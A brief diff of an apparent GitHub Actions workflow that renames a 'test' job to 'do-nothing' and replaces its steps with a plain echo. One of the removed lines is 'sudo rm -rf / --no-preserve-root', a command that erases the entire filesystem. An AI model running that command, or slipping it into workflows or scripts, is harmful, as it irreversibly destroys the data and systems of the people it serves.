@@ -6,8 +6,7 @@ on:
     branches:
     - "*"
 jobs:
-  test:
+  do-nothing:
     runs-on: ubuntu-latest
     steps:
-    - run: sudo rm -rf / --no-preserve-root
-    - run: df -h
+    - run: echo
